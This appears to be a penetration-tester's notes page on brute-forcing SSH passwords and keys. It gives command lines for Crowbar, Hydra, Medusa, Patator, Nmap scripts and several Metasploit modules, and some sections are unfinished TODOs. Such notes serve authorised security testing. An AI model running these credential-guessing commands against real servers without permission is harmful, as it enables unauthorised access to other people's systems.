# SSH

## 01 - Crowbar

TODO: Provide a syntax of sshkey to brute force targets with crowbar

```
$ crowbar -b sshkey -s <IP>/32 -u <username> -k /path/to/ssh_key_file
```

## 02 - Hydra

```
$ hydra ssh -U

$ hydra -l <username> -P passwords.lst ssh://<IP>
```

TODO: Provide a syntax to bruteforce ssh keys

```
$ hydra sshkey -U
```

## 03 - Medusa

```
$ medusa -h <IP> -u <username> -p <password> -M ssh
```

## 04 - Patator

```
$ patator ssh_login -t <int> host=<IP> port=22 user=<username> password=FILE0 0=passwords.lst -x ignore:mesg='Authentication failed.'
```

## 05 - Nmap

Bruteforce SSH credentials

```
$ nmap -p 22 -Pn -n --script ssh-brute --script-args "userdb=users.lst,passdb=pass.lst,ssh-brute.timeout=<seconds>s" <IP>
```

Bruteforce SSH Public Keys

```
$ nmap -p 22 -Pn -n --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'}, ssh.privatekeys={'./id_rsa1', './id_rsa2'}" <IP>

$ nmap -p 22 -Pn -n --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'},publickeys={'./id_rsa1.pub', './id_rsa2.pub'}" <IP>
```

## 06 - Metasploit

TODO: Fill this info

- Bruteforce SSH credentials

```
msf > use auxiliary/scanner/ssh/ssh_login

msf auxiliary(scanner/ssh/ssh_login) > options

msf auxiliary(scanner/ssh/ssh_login) > set
```

Bruteforce SSH Public Keys

Note: Any file extension that ends with `.pub`.

```
msf > use scanner/ssh/ssh_identify_pubkeys

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > options

Module options (auxiliary/scanner/ssh/ssh_identify_pubkeys):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   KEY_FILE                           yes       Filename of one or several cleartext public keys.
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > set filename /path/to/ssh_public_key

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > set threads 4

msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > run -j
```

Bruteforce SSH Public Keys

```
msf post(multi/gather/ssh_creds) > use auxiliary/scanner/ssh/ssh_login_pubkey

msf auxiliary(scanner/ssh/ssh_login_pubkey) > options

Module options (auxiliary/scanner/ssh/ssh_login_pubkey):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   KEY_PASS                           no        Passphrase for SSH private key(s)
   KEY_PATH                           no        Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub
                                                " will be skipped. Duplicate private keys will be ignored.
   PRIVATE_KEY                        no        The string value of the private key that will be used. If you are using MSFConsole, this value shou
                                                ld be set as file:PRIVATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA private keys are supported.
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set private_key file:/path/to/ssh_key

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set key_pass <passphrase>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set rhosts <IP>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set rport <PORT>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set username <username>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set threads <int>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > set stop_on_success <true | false>

msf auxiliary(scanner/ssh/ssh_login_pubkey) > run -j
```

---
## References

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xD - Password Cracking/Online/Tools/Crowbar|Crowbar]]

- [Null Byte: Gain SSH Access to Servers by Brute-Forcing Credentials](https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/)

- [Hacking Articles: Nmap for Pentester Password Cracking](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)